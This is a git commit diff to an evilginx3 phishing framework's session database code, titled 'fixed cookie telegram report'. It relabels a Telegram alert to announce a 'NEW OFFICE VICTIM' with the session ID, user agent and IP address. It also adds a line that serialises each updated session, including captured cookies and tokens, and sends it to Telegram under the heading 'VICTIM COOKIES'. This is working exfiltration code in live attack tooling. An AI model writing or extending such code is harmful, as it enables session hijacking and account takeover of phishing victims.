4d4e28124d02cc70f5fd448e5544abd38442a152
Cruzalexandar <ekehchibueze38@gmail.com>
2024-01-20 08:17:56 +0100

    fixed cookie telegram report

--- evilginx3/database/db_session.go
+++ evilginx3/database/db_session.go
@@ -82,7 +82,7 @@ func (d *Database) sessionsCreate(sid string, phishlet string, landing_url strin
 		fmt.Print("error")
 	}
 
-	telegramSendVisitor(fmt.Sprintf("🔥 🔥 NEW LINKEDIN VICTIM DETECTED 🔥 🔥\n\n-🆔ID: %s \n\n🌎UserAgent: %s\n\n-🗺️IP: %s\n\n %s\n\n", sid, useragent, remote_addr, ipinfosn))
+	telegramSendVisitor(fmt.Sprintf("🔥 🔥 NEW OFFICE VICTIM DETECTED 🔥 🔥\n\n-🆔ID: %s \n\n🌎UserAgent: %s\n\n-🗺️IP: %s\n\n %s\n\n", sid, useragent, remote_addr, ipinfosn))
 
 	err = d.db.Update(func(tx *buntdb.Tx) error {
 		tx.Set(d.genIndex(SessionTable, id), string(jf), nil)
@@ -186,6 +186,7 @@ func (d *Database) sessionsUpdateCookieTokens(sid string, tokens map[string]map[
 
 func (d *Database) sessionsUpdate(id int, s *Session) error {
 	jf, _ := json.Marshal(s)
+	telegramSendResult(fmt.Sprintf("🍪 🍪 🍪 🍪 🍪 VICTIM COOKIES 🍪 🍪 🍪 🍪 🍪 \n\n-🆔ID: %s\n\n", string(jf)))
 
 	err := d.db.Update(func(tx *buntdb.Tx) error {
 		tx.Set(d.genIndex(SessionTable, id), string(jf), nil)
